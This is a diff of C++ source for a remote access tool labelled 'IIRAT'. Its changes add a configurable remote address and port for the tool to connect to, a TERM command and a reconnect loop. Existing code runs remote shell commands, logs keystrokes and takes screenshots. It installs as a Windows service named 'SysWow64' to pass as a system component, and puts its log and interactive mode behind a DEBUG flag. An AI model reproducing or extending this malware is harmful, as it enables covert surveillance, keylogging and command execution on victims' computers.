@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-12 22:59:20
+* @Last Modified time: 2017-04-13 17:53:04
 */
 
 #include <vector>
@@ -14,6 +14,10 @@
 #include <sstream>
 
 using namespace std;
+
+/*******************************************************************************
+|                                   Includes                                   |
+*******************************************************************************/
 
 #if __WIN__
 
@@ -60,6 +64,11 @@ using namespace std;
     #define DPRINT(...)
 #endif
 
+/*******************************************************************************
+|                                     IIRAT                                    |
+*******************************************************************************/
+
+static bool terminated = false;
 static bool logged_in = false;
 
 /* concerned special keycodes */
@@ -111,7 +120,7 @@ bool command_ack = false;
 pthread_mutex_t mutex_socket;
 int send_request(int socket, const char *buffer, int size, bool applylock)
 {
-    int status = 0, wait = 3;
+    int status = 0, wait = 10;
     DPRINT("%s(): %x %d %d\n", __func__, socket, buffer, size, applylock);
 
     /* do we need to apply lock? */
@@ -121,10 +130,7 @@ int send_request(int socket, const char *buffer, int size, bool applylock)
     write(socket, buffer, size);
 
     while(!command_ack && wait-- > 0)
-    {
         sleep(100);
-        DPRINT("%s() retry: command_ack not recieved\n", __func__);
-    }
 
     status = command_ack == true;
 
@@ -251,7 +257,8 @@ void *execute_cmd(void* arguments)
         str = buf.data();
         len = (int)str.size() + 10;
         sprintf(buf.data(), "RSP%07d%s", len, str.c_str());
-        send_request(args->socket, buf.data(), len, true);
+        // send request failed
+        if (!send_request(args->socket, buf.data(), len, true)) break;
     }
 
     DPRINT("%s(): %d\n", __func__, feof(pPipe));
@@ -362,7 +369,7 @@ void *get_screenshot(void* arguments)
     return NULL;
 }
 
-int run(int argc, char *argv[])
+int run(const char* remote_addr, int port)
 {
     int sock, len;
     string cmd, req;
@@ -372,6 +379,9 @@ int run(int argc, char *argv[])
     fd_set active_fd_set, read_fd_set;
 
     pthread_t logger_thread, cmd_thread;
+
+    // reset flag
+    terminated = false;
 
     /* create socket */
     sock = socket(AF_INET , SOCK_STREAM , 0);
@@ -383,9 +393,9 @@ int run(int argc, char *argv[])
 
     /* configurations */
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(9009);
+    addr.sin_port = htons(port);
 
-    if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0)
+    if (inet_pton(AF_INET, remote_addr, &addr.sin_addr) <= 0)
     {
         DPRINT("%s(): address resolve failed\n", __func__);
         return -1;
@@ -403,13 +413,12 @@ int run(int argc, char *argv[])
     /* add client and stdin to read list */
     FD_ZERO(&active_fd_set);
     FD_SET(sock, &active_fd_set);
-    //FD_SET(0, &active_fd_set);
 
     /* start background tasks */
     pthread_mutex_init(&mutex_socket, NULL);
     pthread_create(&logger_thread, NULL, &logger, &sock);
 
-    while(true)
+    while(!terminated)
     {
         read_fd_set = active_fd_set;
 
@@ -496,6 +505,11 @@ int run(int argc, char *argv[])
                         else if (req == "EXEC")
                             /* command to execute */
                             pthread_create(&cmd_thread, NULL, &execute_cmd, &cmdargs);
+
+                        else if (req == "TERM")
+
+                            terminated = true;
+
                     }
                     else if (req == "ACK")
                     {
@@ -523,12 +537,14 @@ void ControlHandler(DWORD request)
     switch(request)
     {
         case SERVICE_CONTROL_STOP:
+            terminated = true;
             ServiceStatus.dwWin32ExitCode = 0;
             ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
             SetServiceStatus (hServiceStatus, &ServiceStatus);
             return;
 
         case SERVICE_CONTROL_SHUTDOWN:
+            terminated = true;
             ServiceStatus.dwWin32ExitCode = 0;
             ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
             SetServiceStatus (hServiceStatus, &ServiceStatus);
@@ -540,7 +556,7 @@ void ControlHandler(DWORD request)
     SetServiceStatus(hServiceStatus,  &ServiceStatus);
 }
 
-void ServiceMain(int argc, char **argv)
+void ServiceMain(int argc, char *argv[])
 {
     ServiceStatus.dwServiceType = SERVICE_WIN32;
     ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
@@ -551,30 +567,29 @@ void ServiceMain(int argc, char **argv)
     ServiceStatus.dwCheckPoint = 0;
     ServiceStatus.dwWaitHint = 0;
 
-    hServiceStatus = RegisterServiceCtrlHandler("ServiceTest", (LPHANDLER_FUNCTION) ControlHandler);
-    if (hServiceStatus == (SERVICE_STATUS_HANDLE) 0) {
-        // Registering Control Handler failed
-        return;
-    }
+    hServiceStatus = RegisterServiceCtrlHandler("SysWow64", (LPHANDLER_FUNCTION) ControlHandler);
+    if (hServiceStatus == (SERVICE_STATUS_HANDLE) 0) return;
 
     ServiceStatus.dwCurrentState = SERVICE_RUNNING;
     SetServiceStatus (hServiceStatus, &ServiceStatus);
 
-    freopen(".SysWow64.log", "a", stdout);
-    run(0, NULL);
-    /*
-    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
-        // Do you important service stuff here
+    #ifdef DEBUG
+        freopen(".SysWow64.log", "a", stdout);
+    #endif
+
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+    {
+        run("0.0.0.0", 9124);
         Sleep(5000);
-    }*/
+    }
 }
 
 int main(int argc, char *argv[])
 {
-    if (argc > 1 && strcmp(argv[1], "app") == 0)
-    {
-        return run(argc, argv);
-    }
+    #ifdef DEBUG
+        if (argc > 1 && strcmp(argv[1], "app") == 0)
+            return run(argv[2], stoi(argv[3]));
+    #endif
 
     SERVICE_TABLE_ENTRY serviceTable[2];
     serviceTable[0].lpServiceName = "SysWow64";
